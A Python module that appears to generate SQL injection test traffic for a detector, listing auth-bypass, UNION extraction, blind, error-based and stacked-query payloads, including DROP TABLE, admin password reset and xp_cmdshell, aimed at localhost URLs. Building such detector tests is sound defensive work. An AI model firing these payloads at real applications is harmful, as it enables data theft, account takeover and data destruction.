"""
tools/sqli_atk.py — SQL Injection attack payload generator
Produces realistic, varied SQLi payloads that reliably trigger sqli.detect()
"""

import random

# Classic authentication bypass
_AUTH_BYPASS = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin'--",
    "' OR 'x'='x",
    "1' OR '1'='1'/*",
]

# UNION-based data extraction
_UNION_SELECT = [
    "1 UNION SELECT username,password FROM users--",
    "1 UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT NULL,@@version--",
    "1 UNION ALL SELECT user(),database()--",
    "0 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--",
]

# Time-based blind SQLi
_TIME_BASED = [
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1 AND BENCHMARK(5000000,MD5(1))--",
    "'; SELECT pg_sleep(5)--",
    "1 OR SLEEP(3)#",
]

# Error-based SQLi
_ERROR_BASED = [
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1; SELECT * FROM information_schema.tables--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

# Stacked queries
_STACKED = [
    "1; DROP TABLE users--",
    "'; INSERT INTO users(username,password) VALUES('hacker','pwned')--",
    "1; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; EXEC xp_cmdshell('whoami')--",
]

ALL_PAYLOADS = _AUTH_BYPASS + _UNION_SELECT + _TIME_BASED + _ERROR_BASED + _STACKED

SQLI_PATHS = ["/search", "/login", "/user", "/product", "/api/query", "/items"]
SQLI_PARAMS = ["id", "user", "username", "search", "query", "item", "category"]


def generate() -> tuple[str, str]:
    """Returns (url_with_payload, body_payload)."""
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(SQLI_PATHS)
    param   = random.choice(SQLI_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
